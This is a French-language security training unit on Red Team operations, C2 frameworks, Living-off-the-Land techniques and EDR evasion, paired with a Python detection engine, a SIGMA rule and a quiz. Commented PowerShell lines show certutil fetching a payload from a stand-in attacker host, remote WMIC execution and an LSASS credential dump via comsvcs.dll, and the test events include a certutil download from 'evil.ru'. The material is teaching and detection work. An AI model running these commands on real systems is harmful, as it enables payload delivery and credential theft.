# TOME P11 — DevSecOps, Cloud Security & Gouvernance — Jour 545 (6h) : Red Team & Adversarial Simulation : C2 Frameworks, Living-off-the-Land & Évasion EDR

> [!NOTE]
> **Objectifs pédagogiques :**
> - Comprendre les opérations **Red Team** (Adversarial Simulation) et leur distinction avec le pentest classique
> - Maîtriser les **frameworks C2 (Command & Control)** modernes : Cobalt Strike, Havoc, Sliver, et leurs mécanismes de communication
> - Appliquer les techniques de **Living-off-the-Land (LotL)** : LOLBAS, attaques sans malware via outils Windows légitimes
> - Comprendre les mécanismes d'**évasion d'EDR** (process injection, AMSI bypass, obfuscation) pour mieux les détecter côté défensif
>
> **Compétences visées :** `SEC-08` (A), `SEC-09` (A) — Red Team, Adversarial Simulation, Defense Evasion

---

## Module 1 — Red Team : Opérations & Méthodologie (2h)

### 📖 Intuition & Narration

Un **pentest** simule un attaquant opportuniste qui cherche la vulnérabilité la plus facile à exploiter dans une fenêtre de temps limitée. Une opération **Red Team** simule un **adversaire ciblé et déterminé** (un APT) qui a pour mission spécifique d'atteindre un objectif défini (ex: compromettre le système de virement bancaire, accéder aux plans stratégiques du COMEX) — quelle que soit la durée nécessaire.

La différence est fondamentale :

```
PENTEST vs RED TEAM

  ┌────────────────────────────────────────────────────────────────────┐
  │  CRITÈRE          │ PENTEST                │ RED TEAM               │
  ├───────────────────┼────────────────────────┼────────────────────────┤
  │  Objectif         │ Trouver des vulnérab.  │ Atteindre un objectif  │
  │                   │ techniques             │ business (flag)        │
  ├───────────────────┼────────────────────────┼────────────────────────┤
  │  Durée            │ Quelques jours         │ 4 à 12 semaines        │
  ├───────────────────┼────────────────────────┼────────────────────────┤
  │  Périmètre        │ Défini et restreint    │ Large, souvent flou    │
  ├───────────────────┼────────────────────────┼────────────────────────┤
  │  Furtivité        │ Non requise            │ Critique (pas se faire │
  │                   │                        │ détecter par le SOC)   │
  ├───────────────────┼────────────────────────┼────────────────────────┤
  │  TTP utilisés     │ Outils génériques      │ TTP d'APT réels (MITRE)│
  ├───────────────────┼────────────────────────┼────────────────────────┤
  │  Connaissance SOC │ "Black Box" possible   │ SOC en conditions       │
  │                   │                        │ réelles (test défense) │
  └────────────────────────────────────────────────────────────────────┘
```

### 🔍 Anatomie d'une Opération Red Team Complète

```
PHASES D'UNE OPÉRATION RED TEAM

  1. RECONNAISSANCE
     ├── OSINT passif (LinkedIn, Shodan, WHOIS, certificats SSL)
     ├── Cartographie de la surface d'attaque externe
     └── Identification des cibles humaines (CFO, Admin SI)

  2. INITIAL ACCESS (Accès Initial)
     ├── Phishing ciblé (Spearphishing avec C2 beacon)
     ├── Exploitation de service exposé (VPN, RDP, API publique)
     └── Physical access simulation (USB drop, tailgating)

  3. ESTABLISH FOOTHOLD (Persistance)
     ├── Déploiement d'un C2 beacon (communication HTTPS chiffrée)
     ├── Persistence : Tâche planifiée, Run key registre, WMI
     └── Anti-forensics : Effacement de logs, timestamps

  4. PRIVILEGE ESCALATION
     ├── Kerberoasting, AS-REP Roasting (AD)
     ├── UAC Bypass, Token Impersonation
     └── Local admin → Domain Admin (BloodHound path)

  5. LATERAL MOVEMENT
     ├── Pass-the-Hash, Overpass-the-Hash
     ├── RDP, PSExec, WinRM, DCOM
     └── Pivoting réseau via tunnel SOCKSv5

  6. OBJECTIVE (Flag)
     └── Accès à la cible finale (base de données, serveur de paiement)
```

---

## Module 2 — C2 Frameworks & Living-off-the-Land (2h)

### 🔍 Frameworks C2 Modernes

Un **Framework C2** est l'infrastructure de commandement et de contrôle utilisée par le Red Team pour piloter ses agents (beacons) déployés sur les machines compromises.

| Framework | Licence | Langage Beacon | Protocol C2 |
|:---:|:---:|:---:|:---|
| **Cobalt Strike** | Commercial (~$3500/an) | Custom (Reflective DLL) | HTTP/HTTPS/DNS/SMB |
| **Havoc** | Open-source | C (Windows) | HTTPS, SMB Pivoting |
| **Sliver** | Open-source (BishopFox) | Go | HTTPS, mTLS, DNS, WireGuard |
| **Brute Ratel** | Commercial | Custom | HTTP/HTTPS |

### 🔍 Living-off-the-Land (LotL) — Attaques sans Malware

Les attaques LotL (Living-off-the-Land) utilisent **les outils légitimes du système d'exploitation Windows** pour réaliser des actions malveillantes, rendant la détection par signatures de malware impossible.

**LOLBAS (Living Off The Land Binaries, Scripts and Libraries)** : Base de données de binaires Windows légitimes abusables.

```powershell
# ============================================================
# PARADIS — Red Team LotL Techniques (À TITRE ÉDUCATIF UNIQUEMENT)
# Ces techniques sont utilisées par les Red Teams pour tester
# les capacités de détection des SOC et des EDR.
# ============================================================

# Technique 1 : Exécution distante via WMIC (T1047)
# wmic /node:"CIBLE" process call create "powershell.exe -EncodedCommand..."

# Technique 2 : Téléchargement de payload via certutil.exe (T1140)
# certutil.exe -urlcache -split -f http://attaquant.internal/payload.b64 payload.b64
# certutil.exe -decode payload.b64 payload.exe

# Technique 3 : Contournement AMSI via obfuscation PowerShell (T1562.001)
# L'obfuscation Str-Join contourne la détection AMSI sur PS non patché
function Invoke-AMSI-Bypass-Demo {
    Write-Host "[INFO] Démonstration conceptuelle - aucun code malveillant"
    # Exemple illustratif uniquement - "Am" + "siIn" + "itFailed" est une technique connue et bloquée
    # Les Red Teams utilisent des techniques évoluant constamment
    Write-Host "[*] Technique : concaténation de strings pour éviter la détection de signature AMSI"
    Write-Host "[Défense] Solution : EDR avec protection comportementale (pas seulement signatures)"
}

# Technique 4 : Process Injection via CreateRemoteThread (T1055.001)
# Injection d'un shellcode dans un processus légitime (ex: notepad.exe)
Write-Host "[*] Process Injection simulée dans notepad.exe"
Write-Host "[Défense] Solution : Falco / Microsoft Defender for Endpoint (règles comportementales)"

# Technique 5 : Dump de credentials via comsvcs.dll (T1003.001)
# rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump [PID_LSASS] lsass.dmp full
Write-Host "[*] LSASS dump via comsvcs.dll (detection : règle Sysmon Event ID 10 sur lsass.exe)"
Write-Host "[Défense] Solution : Credential Guard, LSA Protection, Sysmon + règles SIGMA"
```

---

## Module 3 — Évasion EDR & Perspective Défensive (1h30)

### 🔍 Mécanismes d'Évasion d'EDR & Contre-Mesures

```
TECHNIQUES D'ÉVASION EDR ET CONTRE-MESURES DÉFENSIVES

  TECHNIQUE                    │ CONTRE-MESURE DÉFENSIVE
  ─────────────────────────────┼──────────────────────────────────────
  Process Injection             │ EDR : Surveillance CreateRemoteThread
  (DLL Injection, Shellcode)   │        + Credential Guard
                                │
  AMSI Bypass (PowerShell)      │ Désactiver PowerShell v2,
                                │ Forcer AMSI v3+, Mode Constrained Language
                                │
  Obfuscation (base64, XOR)     │ EDR comportemental (pas signature),
                                │ SIEM : détecter base64 dans args PS
                                │
  Living-off-the-Land (LOLBAS) │ Whitelisting d'applications (AppLocker),
                                │ Sysmon + règles SIGMA pour wmic/certutil
                                │
  Timestomping (anti-forensics)│ Hash des artefacts en temps réel (EDR)
                                │
  DNS Tunneling (C2 via DNS)    │ DNS Security (Umbrella/NextDNS),
                                │ Inspection DPI du trafic DNS
```

### 🛠️ Script Python : LotL Detection Rules (SIGMA-like)

```python
#!/usr/bin/env python3
"""
PARADIS — LotL Detection Engine
Détecte les usages suspects de binaires Windows légitimes (LOLBAS) dans les logs Sysmon.
Basé sur les règles SIGMA (sigma-hq.github.io).
"""
import re
from dataclasses import dataclass
from typing import List

@dataclass
class SysmonEvent:
    event_id: int
    process_name: str
    parent_process: str
    command_line: str
    user: str

@dataclass
class DetectionRule:
    rule_name: str
    mitre_technique: str
    severity: str

    def matches(self, event: SysmonEvent) -> bool:
        raise NotImplementedError

class CertutilDownloadRule(DetectionRule):
    """SIGMA-like : Détecte l'utilisation de certutil pour télécharger un fichier"""
    def __init__(self):
        super().__init__("LOLBAS.Certutil.Download", "T1140", "HAUTE")

    def matches(self, event: SysmonEvent) -> bool:
        return (
            "certutil" in event.process_name.lower() and
            re.search(r"-urlcache|-decode|-encode", event.command_line, re.IGNORECASE) is not None
        )

class WMICRemoteExecutionRule(DetectionRule):
    """SIGMA-like : Détecte WMIC pour exécution distante"""
    def __init__(self):
        super().__init__("LOLBAS.WMIC.RemoteExecution", "T1047", "CRITIQUE")

    def matches(self, event: SysmonEvent) -> bool:
        return (
            "wmic.exe" in event.process_name.lower() and
            "/node:" in event.command_line and
            "process call create" in event.command_line.lower()
        )

class PowerShellEncodedCommandRule(DetectionRule):
    """SIGMA-like : Détecte PowerShell avec une commande encodée en Base64"""
    def __init__(self):
        super().__init__("PowerShell.EncodedCommand", "T1059.001", "HAUTE")

    def matches(self, event: SysmonEvent) -> bool:
        return (
            "powershell" in event.process_name.lower() and
            re.search(r"-EncodedCommand|-enc\s+[A-Za-z0-9+/=]{20,}", event.command_line, re.IGNORECASE) is not None
        )

class LotLDetectionEngine:
    def __init__(self):
        self.rules: List[DetectionRule] = [
            CertutilDownloadRule(),
            WMICRemoteExecutionRule(),
            PowerShellEncodedCommandRule(),
        ]

    def analyze_events(self, events: List[SysmonEvent]):
        print("=== PARADIS LotL DETECTION ENGINE ===\n")
        for event in events:
            for rule in self.rules:
                if rule.matches(event):
                    print(f"  [🚨 {rule.severity}] Règle déclenchée : {rule.rule_name}")
                    print(f"    MITRE        : {rule.mitre_technique}")
                    print(f"    Processus    : {event.process_name}")
                    print(f"    Commande     : {event.command_line[:80]}...")
                    print(f"    Utilisateur  : {event.user}")
                    print()


if __name__ == "__main__":
    test_events = [
        SysmonEvent(1, "certutil.exe", "cmd.exe", "certutil.exe -urlcache -split -f http://evil.ru/p.b64 p.b64", "WKSTN-FIN-05\\user_compta"),
        SysmonEvent(1, "wmic.exe", "cmd.exe", "wmic /node:SRV-DC-01 process call create 'powershell.exe'", "WKSTN-FIN-05\\user_compta"),
        SysmonEvent(1, "powershell.exe", "explorer.exe", "powershell -EncodedCommand JABzACAuAC...", "WKSTN-FIN-05\\user_compta"),
        SysmonEvent(1, "notepad.exe", "explorer.exe", "notepad.exe C:\\Users\\user_compta\\rapport.txt", "WKSTN-FIN-05\\user_compta"),  # Normal
    ]
    engine = LotLDetectionEngine()
    engine.analyze_events(test_events)
```

---

## Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **LotL** | Living-off-the-Land — Technique d'attaque utilisant les outils légitimes du système pour éviter la détection |
| **LOLBAS** | Living Off The Land Binaries, Scripts and Libraries — Catalogue des binaires Windows abusables |
| **AMSI** | Antimalware Scan Interface — Interface Windows permettant aux antivirus de scanner les scripts PowerShell avant exécution |
| **Beacon** | Agent C2 léger déployé sur une machine compromise, qui communique périodiquement avec le serveur C2 de l'attaquant |
| **SIGMA** | Format standardisé open-source de règles de détection SIEM, indépendant du produit |

---

## Exercices Pratiques

### Exercice 1 — Blue Team : Rédaction d'une Règle de Détection

À partir de la technique **LotL via `certutil.exe`** présentée dans ce cours, rédigez une règle de détection SIEM (en pseudo-code SIGMA) qui pourrait déclencher une alerte lors d'un usage suspect de `certutil.exe`.

**Corrigé guidé :**
```yaml
title: Certutil Utilisé pour Téléchargement ou Décodage
id: paradis-certutil-lolbas-001
status: production
description: Détecte l'utilisation de certutil.exe avec des arguments suspects (download, decode)
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - '-decode'
      - '-encode'
      - '-f http'
      - '-f https'
  condition: selection
falsepositives:
  - Opérations IT légitimes (rare) — valider avec l'équipe IT
level: high
tags: [attack.defense_evasion, attack.t1140]
```

---

## Banque QCM — 5 Questions

**Q1.** Quelle est la principale différence entre un **pentest** et une opération **Red Team** ?

- A) Le pentest est plus long que le Red Team.
- B) Le Red Team simule un adversaire ciblé tentant d'atteindre un objectif business spécifique avec des TTP réels d'APT et en maximisant la discrétion, tandis que le pentest cherche à identifier le maximum de vulnérabilités techniques dans un périmètre défini. ✅
- C) Le Red Team n'utilise jamais d'outils d'exploitation.
- D) Le pentest cible toujours des applications web.

**Q2.** Qu'est-ce que le **Living-off-the-Land (LotL)** dans le contexte des attaques Red Team ?

- A) Utiliser des fermes de serveurs pour héberger le C2.
- B) Utiliser des outils et binaires légitimes du système d'exploitation (wmic.exe, certutil.exe, PowerShell) pour réaliser des actions malveillantes, rendant la détection par signature de malware inopérante. ✅
- C) Effectuer une attaque sans connexion internet.
- D) Exploiter des vulnérabilités de la couche réseau.

**Q3.** Qu'est-ce que l'**AMSI (Antimalware Scan Interface)** de Windows ?

- A) Un protocole de communication entre les contrôleurs de domaine.
- B) Une interface Windows permettant aux moteurs antivirus/EDR de scanner le contenu des scripts PowerShell, VBScript et JScript avant leur exécution par l'interpréteur. ✅
- C) Un outil de chiffrement des communications réseau.
- D) Un système de gestion des licences logicielles.

**Q4.** Un **beacon C2** est caractérisé par :

- A) Un processus qui consomme 100% du CPU de la machine compromise.
- B) Un agent léger et furtif déployé sur la machine compromise qui communique périodiquement (check-in) avec le serveur C2 de l'attaquant via des protocoles courants (HTTPS, DNS) pour recevoir des instructions. ✅
- C) Un malware qui chiffre les fichiers de la victime.
- D) Un outil de scan de réseau.

**Q5.** Le format **SIGMA** est utilisé pour :

- A) Chiffrer les communications entre les agents C2 et le serveur.
- B) Écrire des règles de détection SIEM standardisées et indépendantes du produit SIEM utilisé, permettant le partage de règles entre organisations. ✅
- C) Gérer les identités dans Active Directory.
- D) Générer des certificats TLS pour les services web.

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
